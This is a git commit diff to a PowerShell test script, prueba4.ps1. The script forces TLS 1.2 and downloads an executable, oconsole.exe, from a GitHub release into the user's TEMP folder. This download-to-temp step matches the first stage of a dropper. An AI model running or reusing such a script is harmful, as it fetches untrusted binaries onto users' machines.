c3430ad002e667c84d118b7fef59709a07da21df
mirapuedovolar2 <cuentaparametasimon@gmail.com>
2025-04-24 10:43:28 -0400

    Update prueba4.ps1

--- prueba4.ps1
+++ prueba4.ps1
@@ -1,4 +1,5 @@
-$destino = "env:TEMP\codigo2.exe"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$destino = "$env:TEMP\oconsole.exe"
 $url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebahola/oconsole.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $destino
